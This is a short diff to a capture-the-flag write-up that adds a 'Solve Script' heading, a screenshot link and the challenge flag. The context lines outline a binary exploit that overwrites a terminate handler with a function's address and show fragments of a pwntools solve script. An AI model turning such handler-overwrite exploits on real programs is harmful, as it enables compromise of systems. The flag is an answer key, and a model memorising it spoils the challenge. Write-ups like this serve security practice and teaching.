@@ -31,6 +31,8 @@ In the encrypt message function, if you give too many messages to encrypt, it wi
 1. Overwrite terminate handler with the address of the useless function
 2. Give a large number to encrypt message and terminate the program
 
+## Solve Script
+
 ```py
 #!/usr/bin/python
 from pwn import *
@@ -93,3 +95,7 @@ sla(b"hash? ", str(10000000000000000))
 
 p.interactive()
 ```
+
+![image](https://github.com/user-attachments/assets/108a3920-876b-4681-b223-317915787f21)
+
+> UMCS{AW3S0ME_3NCRYPT0R_S0LLV33_73bb3661}
